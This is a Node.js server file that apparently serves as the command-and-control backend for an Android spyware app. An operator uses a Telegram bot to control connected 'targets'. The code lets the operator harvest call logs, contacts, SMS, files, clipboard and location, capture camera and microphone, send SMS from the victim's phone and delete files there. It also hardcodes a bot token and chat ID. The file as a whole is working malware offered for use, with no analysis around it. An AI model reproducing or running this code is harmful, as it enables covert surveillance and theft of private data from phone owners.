const socket = require('ws')
const http = require('http')
const express = require("express")
const TelegramBot = require('node-telegram-bot-api')
const multer = require('multer');
const bodyParser = require('body-parser')
const uuid4 = require('uuid')
const axios = require('axios')
const log4js = require('log4js')

const upload = multer();
const app = express()
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new socket.Server({server});
const chatId = '878639262'
const token = '5449954782:AAEo2rf1IQ4fG1zYYrT8XXR8Oniq9Evze4g'
const serverAddr = '192.168.1.157:8999'
const bot = new TelegramBot(token, {polling: true});

log4js.configure({
 appenders: {
  out: { type: 'stdout' },
  app: { type: 'file', filename: 'logs/info.log' ,maxLogSize: 10 * 1000 * 1000},
 },
 categories: {
  default: { appenders: [ 'out', 'app' ], level: 'all' },
 }
});
 
var logger = log4js.getLogger();

// request -------------------------------------------------------------------
app.get("/", (req, res) => {
    res.send('<h1 style="text-align:center;">Everything ok now edit apk src 🐕l</h1>')
})
app.post("/sendFile", upload.single('file'), (req, res) => {
    var name = req.file.originalname

    bot.sendDocument(chatId, req.file.buffer, {}, {
        filename: name,
        contentType: 'application/txt',
    }).catch(function (error) {
        logger.info(error);
    })
    res.send(name)
})
app.post("/sendText", (req, res) => {
    bot.sendMessage(chatId, req.body['data'], {parse_mode: "HTML"})
    res.send(req.body['data'])
})
app.post("/sendLocation", (req, res) => {
    bot.sendLocation(chatId, req.body['l1'], req.body['l2'])
    res.send(req.body['l1'].toString())
})
server.listen(process.env.PORT || 8999, () => {
    logger.info(`Server started on port ${server.address().port}`);
});
// ----------------------------------------------------------------------------- ws://127.0.0.1:8999

// real time -------------------------------------------------------------------
wss.on('connection', (ws, req) => {
    ws.uuid = uuid4.v4()
    logger.info(`uuid ${ws.uuid} ip ${req.socket.remoteAddress.toString().replaceAll('f', '').replaceAll(':', '')}`)
    bot.sendMessage(chatId, `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.toString().replaceAll('f', '').replaceAll(':', '')}</b> 🌐`, {parse_mode: "HTML"})
});
setInterval(() => {
    wss.clients.forEach((client) => {
        client.send("be alive");
    });
}, 2000);
bot.on("message", (msg) => {
    if (msg.text === '/start') {
        bot.sendMessage(chatId, "Welcome", {
            "reply_markup": {
                "keyboard": [["Status ⚙"], ["Action ☄"]]
            }
        });
    }
    if (msg.text === "Status ⚙") {
        const clientCount = wss.clients.size
        let status = '';
        if (clientCount > 0) {
            status += `<b>${clientCount} Online Client</b> ✅\n\n`
            wss.clients.forEach((ws) => {
                status += `<b>ID => </b><code>${ws.uuid}</code>\n\n`
            })
        } else {
            status += `<b>No Online Client</b> ❌`
        }
        bot.sendMessage(chatId, status, {parse_mode: "HTML"});
    }
    if (msg.text === "Action ☄") {
        const clientCount = wss.clients.size
        if (clientCount > 0) {
            let Actions = [
                [{text: 'Call Log 📞', callback_data: "cl"},{text: 'All Contact 👤', callback_data: "gc"}],
                [{text: 'All Sms 💬', callback_data: "as"},{text: 'Send Sms 💬', callback_data: "ss"}],
                [{text: 'Installed Apps 📲', callback_data: "ia"},{text: 'Device Model 📱', callback_data: 'dm'}],
                [{text: 'Get Folder / File 📄', callback_data: 'gf'},{text: 'Delete Folder / File 🗑', callback_data: 'df'}],
                [{text: 'Main Camera 📷', callback_data: 'cam1'},{text: 'Front Camera 🤳', callback_data: 'cam2'}],
                [{text: 'Mic 1 🎤', callback_data: 'mi1'},{text: 'Mic 2 🎤', callback_data: 'mi2'},{text: 'Mic 3 🎤', callback_data: 'mi3'}],
                [{text: 'Clip Board 📄', callback_data: 'cp'}],
            ]
            wss.clients.forEach((ws) => {
                bot.sendMessage(chatId, `<b>☄ Select Action For Device :</b>\n&${ws.uuid}`, {
                    reply_markup: {
                        inline_keyboard: Actions,
                        // force_reply: true,
                    },
                    parse_mode: "HTML"
                })
            })
        } else {
            bot.sendMessage(chatId, `<b>No Online Client</b> ❌`, {parse_mode: "HTML"});
        }
    }
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.split('&')[0] === 'ss'){
            const data = msg.text.split(']')[0].split("[")[1]
            const uuid = msg.reply_to_message.text.split('!')[0].split('&')[1]
            wss.clients.forEach(client=>{
                if (client.uuid === uuid) {
                    client.send(`ss&${data}`)
                }
            })
            bot.sendMessage(chatId, "Your Request Is On Progress !", {
                "reply_markup": {
                    "keyboard": [["Status ⚙"], ["Action ☄"]]
                }
            });
        }
        if (msg.reply_to_message.text.split('&')[0] === 'df' || msg.reply_to_message.text.split('&')[0] === 'gf') {
            const text = msg.reply_to_message.text;
            const action = text.split('!')[0].split('&')[0]
            const uuid = text.split('!')[0].split('&')[1]
            const path = msg.text
            wss.clients.forEach(client => {
                if (client.uuid === uuid) {
                    client.send(`${action}&${path}`)
                }
            })
            bot.sendMessage(chatId, "Your Request Is On Progress !", {
                "reply_markup": {
                    "keyboard": [["Status ⚙"], ["Action ☄"]]
                }
            });
        }
    }
})

bot.on('callback_query', function onCallbackQuery(callbackQuery) {
    const action = callbackQuery.data;
    const clientId = callbackQuery.message.text.split('&')[1];
    wss.clients.forEach(client => {
        if (client.uuid === clientId) {
            if (action === 'ss') {
                bot.sendMessage(
                    chatId,
                    `ss&${client.uuid}!\n\n<b>Action Send Sms\n🔵 Please Reply\n</b> <code>[{"number":"target number","message":"your message"}]</code>`,
                    {
                        reply_markup: {
                            force_reply: true,
                        },
                        parse_mode: "HTML"
                    }
                )
            } else if (action === 'gf') {
                bot.sendMessage(
                    chatId,
                    `gf&${client.uuid}!\n\n<b>Action Get File / Folder\n🔵 Please Reply File / Folder Path:</b>`,
                    {
                        reply_markup: {
                            force_reply: true,
                        },
                        parse_mode: "HTML"
                    }
                )
            } else if (action === 'df') {
                bot.sendMessage(
                    chatId,
                    `df&${client.uuid}!\n<b>Action Delete File / Folder\n🔵 Please Reply File / Folder Path:</b>`,
                    {
                        reply_markup: {
                            force_reply: true,
                        },
                        parse_mode: "HTML"
                    }
                )
            } else {
                client.send(action)
            }
        }
    })
});

// real time -------------------------------------------------------------------
// setInterval(() => {
//     axios.get(serverAddr)
// }, 120000);
